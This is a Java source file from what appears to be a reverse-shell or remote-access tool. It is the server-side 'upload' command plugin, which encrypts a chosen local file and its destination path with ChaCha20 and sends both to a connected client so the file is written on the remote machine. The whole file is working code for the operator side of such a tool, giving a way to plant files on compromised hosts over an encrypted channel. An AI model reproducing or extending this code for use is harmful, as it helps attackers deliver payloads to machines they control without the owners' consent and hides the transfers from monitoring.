package obs1d1anc1ph3r.reverseshell.server.plugins.proactive;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import obs1d1anc1ph3r.reverseshell.server.commandhandling.CommandSender;
import obs1d1anc1ph3r.reverseshell.server.encryption.ChaCha20Server;

public class UploadServerCommand implements ProactiveCommandPlugin {

	private byte[] fileData;
	private byte[] nonceMetadata;
	private byte[] nonceFile;
	private byte[] encryptedFileData;
	private byte[] encryptedMetadata;
	private String localFilePath;

	private DataOutputStream dataOut;
	private CommandSender commandSender;

	@Override
	public void execute(DataOutputStream dataOut, byte[] encryptionKey, CommandSender commandSender, String command) throws Exception {
		this.dataOut = dataOut;
		this.commandSender = commandSender;

		String[] parts = command.split(" ", 3);
		if (parts.length < 3) {
			System.out.println("[ERROR] Usage: upload <local_file_path> <remote_dest_path>");
			return;
		}

		localFilePath = parts[1];
		String remoteDestPath = parts[2];

		File file = new File(localFilePath);
		if (!file.exists() || !file.isFile()) {
			System.out.println("[ERROR] File not found: " + localFilePath);
			return;
		}

		fileData = Files.readAllBytes(Paths.get(localFilePath));

		// Generate two nonces: one for metadata and one for file data.
		nonceMetadata = ChaCha20Server.generateNonce();
		nonceFile = ChaCha20Server.generateNonce();

		// Encrypt the file data with nonceFile.
		encryptedFileData = ChaCha20Server.encrypt(encryptionKey, nonceFile, fileData);

		// Prepare metadata (remote path + file size) and encrypt it.
		String metadata = remoteDestPath + " " + encryptedFileData.length;
		encryptedMetadata = ChaCha20Server.encrypt(encryptionKey, nonceMetadata, metadata.getBytes());

		// Send data
		sendDataToClient();
	}

	private void sendDataToClient() throws IOException {
		// Ensure dataOut is set
		if (dataOut == null || commandSender == null) {
			System.err.println("[ERROR] Data output stream or CommandSender is not initialized.");
			return;
		}

		// Inform client to expect a file transfer
		commandSender.sendCommand("upload " + encryptedFileData.length);

		// Send metadata
		dataOut.writeInt(nonceMetadata.length + encryptedMetadata.length);
		dataOut.write(nonceMetadata);
		dataOut.write(encryptedMetadata);
		dataOut.flush();

		// Send file data
		dataOut.writeInt(nonceFile.length + encryptedFileData.length);
		dataOut.write(nonceFile);
		dataOut.write(encryptedFileData);
		dataOut.flush();

		System.out.println("[INFO] File sent successfully: " + localFilePath);
	}
}
